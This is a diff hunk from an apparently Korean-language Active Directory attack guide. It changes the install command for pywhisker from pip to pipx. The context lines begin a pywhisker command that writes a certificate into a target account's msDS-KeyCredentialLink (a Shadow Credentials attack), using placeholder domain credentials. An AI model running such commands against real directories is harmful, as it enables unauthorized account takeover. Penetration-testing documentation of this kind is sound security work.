@@ -466,7 +466,7 @@ Windows Server 2016 이상 DC 환경에서만 동작하며, DC에 PKINIT 지원�
 ```bash
 # Linux — pywhisker로 키 자격증명 추가
 # pywhisker는 대상 계정의 msDS-KeyCredentialLink에 자체 서명 인증서를 추가함
-pip install pywhisker
+pipx install pywhisker
 
 pywhisker -d corp.local -u john -p 'Password1!' \
   --target targetuser \
